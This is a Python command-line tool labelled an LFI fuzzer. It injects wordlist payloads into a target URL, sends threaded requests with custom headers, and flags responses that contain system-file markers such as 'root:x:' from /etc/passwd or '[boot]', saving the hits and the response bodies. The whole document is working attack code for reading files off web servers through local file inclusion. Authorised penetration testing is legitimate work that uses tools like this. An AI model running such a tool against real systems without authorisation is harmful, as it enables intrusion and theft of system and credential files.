import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from rich.progress import Progress
import argparse
import os
import re

# --- Arguments ---
parser = argparse.ArgumentParser(description="LFI Fuzzer with Rich progress bar")
parser.add_argument("-w", "--wordlist", required=True, help="Path to payload wordlist")
parser.add_argument("-t", "--threads", type=int, default=1, help="Number of threads (default: 1)")
parser.add_argument("-o", "--output", default="lfi_results.txt", help="Output file for all results")
parser.add_argument("-u", "--url", required=True, help="Target URL with {} as payload placeholder")
parser.add_argument("-H", "--headers-file", required=True, help="Path to headers file (one per line: Header: value)")
parser.add_argument("-s", "--success", default="lfi_success.txt", help="Output file for successful payloads")
parser.add_argument("-k", "--keywords", default="root:x:,Windows,[boot]", help="Comma-separated keywords to detect success (default: root:x:,Windows,[boot])")
parser.add_argument("-S", "--save-responses", action="store_true", help="Save response bodies in responses/ folder")
args = parser.parse_args()

wordlist = args.wordlist
threads = args.threads
output_file = args.output
success_file = args.success
url = args.url
success_keywords = [k.strip() for k in args.keywords.split(",")]
save_responses = args.save_responses

headers = {}
with open(args.headers_file, "r", encoding="utf-8") as f:
    for line in f:
        line = line.strip()
        if line and ":" in line:
            key, value = line.split(":", 1)
            headers[key.strip()] = value.strip()

# --- Ensure response folder exists ---
if save_responses:
    os.makedirs("responses", exist_ok=True)

# --- Helper to sanitize filenames ---
def sanitize_filename(s):
    return re.sub(r'[^a-zA-Z0-9_\-]', '_', s)[:100]

# --- Fetch function ---
def fetch(payload):
    target = url.format(payload)
    try:
        r = requests.get(target, headers=headers, timeout=5)
        success = any(keyword in r.text for keyword in success_keywords)

        # Save response if flag is set
        if save_responses:
            filename = f"responses/{sanitize_filename(payload)}.txt"
            with open(filename, "w", encoding="utf-8", errors="ignore") as f:
                f.write(r.text)

        return payload, r.status_code, success
    except Exception:
        return payload, "ERROR", False

# --- Main fuzzing function ---
def fuzz():
    with open(wordlist, "r", encoding="utf-8", errors="ignore") as f:
        payloads = [line.strip() for line in f if line.strip()]

    with open(output_file, "w") as out, open(success_file, "w") as success, Progress() as progress:
        task = progress.add_task("[cyan]Fuzzing...", total=len(payloads))

        if threads > 1:
            with ThreadPoolExecutor(max_workers=threads) as executor:
                future_to_payload = {executor.submit(fetch, p): p for p in payloads}
                for future in as_completed(future_to_payload):
                    payload, status, is_success = future.result()
                    out.write(f"{payload} | {status}\n")
                    if is_success:
                        success.write(f"{payload} | {status}\n")
                        print(f"{payload} | {status}\n")
                    progress.update(task, advance=1, description=f"[cyan]Fuzzing... [green]{payload}[/green] [{status}]")
        else:
            for payload in payloads:
                payload, status, is_success = fetch(payload)
                out.write(f"{payload} | {status}\n")
                if is_success:
                    success.write(f"{payload} | {status}\n")
                    print(f"{payload} | {status}\n")
                progress.update(task, advance=1, description=f"[cyan]Fuzzing... [green]{payload}[/green] [{status}]")

if __name__ == "__main__":
    fuzz()
